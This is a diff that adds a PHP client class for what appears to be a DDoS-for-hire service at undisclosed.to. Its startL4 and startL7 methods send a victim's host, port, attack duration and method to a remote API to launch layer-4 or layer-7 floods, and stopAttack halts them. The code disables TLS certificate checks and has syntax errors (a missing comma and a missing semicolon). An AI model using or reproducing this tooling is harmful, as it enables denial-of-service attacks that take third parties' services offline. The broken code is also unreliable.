@@ -1,0 +1,87 @@
+<?php
+/*
+ *  Undisclosed.to PHP API cURL Example.
+ *  
+ *  @author  Machiavel
+ *  @link    https://undisclosed.to/
+ *
+*/
+
+class API {
+	
+	private $username = "";
+	private $key = "";   
+	private $curl_handle;
+	
+	public function __construct($username, $key){
+		$this->username = $username;
+		$this->apiKey = $key;
+		$this->curl_handle = null;
+		try {
+			if(empty($this->username) || empty($this->apiKey)){
+				throw new Exception('Username and API Key must be defined.');
+			}
+		} catch (Exception $e) {
+			exit($e->getMessage());
+		}
+	}
+	public function __destruct() {
+		if (!is_null($this->curl_handle))
+			curl_close($this->curl_handle);
+	}
+	public function startL4($host, $port, $time, $method, $slots = 1){
+		$postdata = [
+			'host' => $host,
+			'port' => $port,
+			'time' => $time,
+			'method' => $method,
+			'slots' => $slots
+			'layer' => 4
+		];
+		return $this->send($postdata);
+	}
+	public function startL7($host, $time, $method, $slots = 1, $type = "GET"){
+		$postdata = [
+			'host' => $host,
+			'time' => $time,
+			'method' => $method,
+			'slots' => $slots,
+			'type' => $type,
+			'layer' => 7
+		];
+		return $this->send($postdata);
+	}
+	public function stopAttack($host){
+		$postdata = [
+			'host' => $host
+		];
+		return $this->send($postdata, "stopAttack");
+	}
+	private function send(array $parameters = [], $action = "startAttack"){
+		$api_url = "https://api.undisclosed.to/v1/" . $action;
+		$parameters['user'] = $this->username;
+		$parameters['api_key'] = $this->apiKey;
+		$parameters = http_build_query($parameters, '', '&');
+		if(is_null($this->curl_handle)){
+			$this->curl_handle = curl_init($api_url);
+			curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, TRUE);
+			curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, FALSE)
+			curl_setopt($this->curl_handle, CURLOPT_ENCODING, "");
+			curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);
+			curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+			curl_setopt($this->curl_handle, CURLOPT_POST, 1);
+			curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $parameters);
+			curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER , array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));
+		}
+		switch($response = curl_exec($this->curl_handle)){
+			case false:
+				return curl_error($this->curl_handle);
+			break;
+			default:
+				$response = json_decode($response, true);
+				return $response["message"];
+			break;
+		}
+	}
+}
+?>
